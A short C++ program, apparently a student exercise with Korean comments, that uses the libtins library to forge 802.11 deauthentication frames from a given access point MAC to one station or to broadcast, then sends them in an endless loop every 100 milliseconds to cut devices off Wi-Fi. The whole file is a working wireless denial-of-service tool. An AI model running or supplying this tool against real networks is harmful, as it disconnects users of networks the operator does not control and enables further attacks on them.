#include <tins/tins.h>
#include <thread>
#include <chrono>
#include <iostream>

// send_deauth <interce name> <ap mac> [<station mac>]
// ap에서 station으로 보냄
using namespace Tins;
using namespace std; // 정의된 namespace에 잇는 것들을 쓰게 해줌
string interface_name;

Dot11Deauthentication setdeauth(){
    string iname[3]; // interface name and ap mac and station mac
    Dot11Deauthentication deauth;
    cout << "input <interface name> <ap mac> [<station mac>] : " << endl;
    std::getline(cin,iname[0]); // http://yyman.tistory.com/entry/C-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%9E%85%EB%A0%A5-%EB%B0%9B%EA%B8%B0-string
    std::getline(cin,iname[1]);
    std::getline(cin,iname[2]);
    cout << "your input : " << iname[0] << iname[1] << iname[2] << endl;
    interface_name=iname[0];
    if(iname[2].empty()) // if array is empty then return value is 1
        deauth.addr1(Dot11::BROADCAST);
    else
        deauth.addr1(iname[2]); //Receiver, destination
    deauth.addr2(iname[1]); // transmitter, source
    deauth.addr3(iname[1]); // bssid
    return deauth;
}

int main() { // wifi 끊기
    PacketSender sender;
    RadioTap rt; // radio protocol
    rt.inner_pdu(setdeauth());
    sender.default_interface(interface_name);

    while(1){
    sender.send(rt);
    std::this_thread::sleep_for(std::chrono::milliseconds(100)); //없어도 되지만 없으면 한번에 엄청난 패킷을 보냄
    cout << "working " << endl;
    }
}
